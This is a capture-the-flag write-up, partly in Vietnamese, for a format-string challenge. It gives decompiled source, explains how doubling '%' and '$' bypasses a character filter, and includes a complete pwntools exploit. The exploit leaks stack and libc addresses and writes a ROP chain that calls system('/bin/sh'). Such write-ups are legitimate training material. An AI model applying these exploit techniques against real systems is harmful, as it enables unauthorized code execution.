# FormatString3

## Mitigation

```text
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## source code

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+8h] [rbp-8h]

  init(argc, argv, envp);
  v4 = 0;
  puts("Viettel Challenge\n");
  printf("Give me your name: ");
  fgets(name, 20, stdin);
  while ( v4 <= 2 )
  {
    puts("\nCan you fix bug for me?");
    s[(int)read(0, s, 20uLL) - 1] = 0;
    if ( strncmp(s, "yes", 3uLL) )
    {
      puts("Whatever, see you again");
      return 0;
    }
    puts("Let me see");
    filter(s);
    puts("It'seem good");
    printf(s);
    ++v4;
  }
  return 0;
}
```

```C
__int64 __fastcall filter(const char *a1)
{
  __int64 result; // rax
  unsigned int i; // [rsp+14h] [rbp-Ch]
  int j; // [rsp+18h] [rbp-8h]
  int v4; // [rsp+1Ch] [rbp-4h]

  v4 = strlen(a1);
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( (int)i >= v4 )
      break;
    if ( a1[i] == asc_DED[0] || a1[i] == asc_DEF[0] ) //asc_DED         db '%',0  ;  asc_DEF         db '$',0
    {
      for ( j = i; v4 - 1 > j; ++j )
        a1[j] = a1[j + 1];
      a1[j] = 0;
    }
  }
  return result;
}
```

## Vulnerability

Có một lỗi format string ở hàm `printf(s)`. Nhưng trước đó `s` được xử lý qua hàm `filter`. Hàm `filter` kiểm tra lần lượt các kí tự xem có trùng với 2 kí tự bị blacklist hay ko. Nếu có, nó sẽ xóa kí tự đó và chuyển các kí tự phía sau lên. ví dụ: `"a%p\x00" => "ap\x00\x00"`. Như vậy ta có thể dễ dàng bypass hàm này với việc xử dụng 2 kí tự bị chặn  cùng lúc. ví dụ: `"a%%p\x00" => "a%p\x00\x00"`. Hàm `strncmp` chỉ so sánh 3 kí tự đầu tiên nên ta hoàn toàn có thể bypass nó bằng cách nhập `"yes"` và thêm các kí tự khác ở sau.
Vòng lặp chỉ chạy 2 lần, vừa đủ để 1 lần tạo con trỏ tới địa chỉ của index, 1 lần để thay đổi giá trị của index.

## Exploit

```python
p = start()
libc = ELF('./libc6_2.35-0ubuntu3.1_amd64.so')

p.sendlineafter(b'name: ',b'ba')

# leak a stack address and libc address
payload = b'yes%%13$$p%%9$$pp'
p.sendafter(b'me?', payload)

p.recvuntil(b'yes')
index_addr = int(p.recv(14),16) - 0x120
libc.address = int(p.recv(14),16) - 0x29d90
log.info('index_addr: ' + hex(index_addr))
rop = ROP(libc)
log.info('libc.address: ' + hex(libc.address))

# make a offset point to the index_addr
payload = b'yes%%' + str((index_addr & 0xffff)).encode() + b'c%%13$$hnn'
p.sendafter(b'me?', payload)

# change value of index 
payload = b'yes%%252c%%43$$hhnn'
p.sendafter(b'me?', payload)

def write_payload(value, address):
    for i in range(4):
        # make a offset point to the address
        payload = b'yes%%' + str((address & 0xffff)-3).encode() + b'c%%13$$hnn'
        p.sendafter(b'me?', payload)
        # change value of address
        payload = b'yes%%' + str((value & 0xffff)-3).encode() + b'c%%43$$hnn'
        p.sendafter(b'me?', payload)
        value = value >> 16
        if(value == 0):
            break
        address += 2

# change value of saved rip
# write pop rdi gadget to saved rip
write_payload(rop.find_gadget(['pop rdi', 'ret'])[0], index_addr + 0x10)
# write /bin/sh to rdi
write_payload(next(libc.search(b'/bin/sh')), index_addr + 0x18)
# ret gadget
write_payload(rop.find_gadget(['ret'])[0], index_addr + 0x20)
# write system to saved rip
write_payload(libc.sym['system'], index_addr + 0x28)

p.sendafter(b'me?', b'get shell hehe')

p.interactive()
```

Ở bài này nếu như làm trên server, ta vẫn hoàn toàn có thể leak  được địa chỉ của 1 hàm trong libc. Từ đó tìm ra phiên bản libc được sử dụng. Thay vì gọi `system('/bin/sh')` ta sẽ gọi `puts(puts_got)`.